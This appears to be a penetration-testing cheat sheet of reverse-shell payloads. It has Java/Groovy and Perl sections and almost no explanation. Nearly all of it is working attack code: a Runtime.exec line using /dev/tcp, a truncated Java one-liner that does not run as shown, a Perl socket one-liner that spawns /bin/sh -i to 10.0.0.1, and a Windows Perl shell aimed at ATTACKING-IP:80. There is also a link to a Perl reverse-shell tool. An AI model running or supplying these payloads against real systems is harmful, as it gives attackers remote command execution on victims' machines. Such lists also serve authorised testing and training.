## <mark style="color:red;">JAVA</mark>

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

one-liner:

```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/666;c
```



## <mark style="color:red;">Perl</mark>

#### <mark style="color:green;">Save this as a CGI file: - you can always just use a command line as well</mark>

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### <mark style="color:orange;">perl-reverse-shell</mark>

​​[http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

### <mark style="color:orange;">Perl Windows Reverse Shell</mark>

```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```



